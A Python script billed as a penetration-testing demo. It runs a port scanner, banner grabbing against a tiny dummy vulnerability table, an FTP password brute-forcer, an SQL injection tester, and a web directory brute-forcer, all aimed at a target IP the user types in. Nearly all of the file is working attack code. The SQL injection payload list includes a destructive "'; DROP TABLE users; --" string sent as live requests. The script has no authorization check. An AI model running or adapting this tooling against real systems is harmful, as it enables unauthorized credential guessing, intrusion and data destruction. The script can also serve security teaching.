import socket
import requests
import ftplib
from datetime import datetime

# -------------------------------
# Vulnerability Database (Dummy)
# -------------------------------
vulnerabilities = {
    "Apache/2.2.8": "Outdated Apache version - vulnerable to CVE-2009-3555",
    "OpenSSH_4.7": "Old OpenSSH version - possible remote exploits",
    "Microsoft-IIS/6.0": "IIS 6.0 is deprecated - vulnerable to multiple attacks"
}

# -------------------------------
# Port Scanner
# -------------------------------
def scan_ports(target, ports):
    open_ports = []
    print(f"\n[*] Scanning {target} ...")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is OPEN")
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

# -------------------------------
# Banner Grabbing
# -------------------------------
def grab_banner(ip, port):
    try:
        sock = socket.socket()
        sock.settimeout(1)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except:
        return None

# -------------------------------
# Vulnerability Check
# -------------------------------
def check_vulnerabilities(banner):
    for vuln in vulnerabilities:
        if vuln in banner:
            return vulnerabilities[vuln]
    return "No known vulnerability in database."

# -------------------------------
# FTP Brute Force Demo
# -------------------------------
def ftp_bruteforce(target, user, wordlist):
    print(f"\n[*] Starting FTP Brute Force on {target}")
    for password in wordlist:
        try:
            ftp = ftplib.FTP(target)
            ftp.login(user, password)
            print(f"[+] Found credentials: {user}:{password}")
            ftp.quit()
            return
        except:
            print(f"[-] Failed: {user}:{password}")
    print("[!] No valid credentials found.")

# -------------------------------
# SQL Injection Test (Demo)
# -------------------------------
def sql_injection_test(url, param):
    print(f"\n[*] Testing SQL Injection on {url}")
    payloads = ["' OR '1'='1", "' OR 'x'='x", "'; DROP TABLE users; --"]
    for payload in payloads:
        new_url = f"{url}?{param}={payload}"
        try:
            r = requests.get(new_url, timeout=3)
            if "error" in r.text.lower() or "syntax" in r.text.lower():
                print(f"[+] Possible SQL Injection vulnerability with payload: {payload}")
            else:
                print(f"[-] No error with payload: {payload}")
        except:
            print("[-] Request failed.")

# -------------------------------
# Directory Brute Force (Web fuzzing)
# -------------------------------
def dir_bruteforce(url, wordlist):
    print(f"\n[*] Starting Directory Brute Force on {url}")
    for word in wordlist:
        test_url = f"{url}/{word}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                print(f"[+] Found directory: {test_url}")
        except:
            pass

# -------------------------------
# Main Penetration Testing Script
# -------------------------------
if __name__ == "__main__":
    target = input("Enter Target IP (e.g., 127.0.0.1): ")
    ports_to_scan = [21, 22, 23, 25, 80, 110, 143, 443, 3389]

    start_time = datetime.now()
    open_ports = scan_ports(target, ports_to_scan)

    print("\n[*] Banner Grabbing and Vulnerability Check:")
    for port in open_ports:
        banner = grab_banner(target, port)
        if banner:
            print(f"\n[Port {port}] Service Banner: {banner}")
            print(" -> " + check_vulnerabilities(banner))
        else:
            print(f"\n[Port {port}] No banner retrieved.")

    # FTP Brute Force Demo
    ftp_wordlist = ["1234", "admin", "password", "toor"]
    ftp_bruteforce(target, "admin", ftp_wordlist)

    # SQL Injection Test Demo
    sql_injection_test("http://127.0.0.1/vulnerable.php", "id")

    # Directory Brute Force Demo
    wordlist = ["admin", "login", "test", "uploads"]
    dir_bruteforce("http://127.0.0.1", wordlist)

    end_time = datetime.now()
    print("\n[*] Scan completed in:", end_time - start_time)
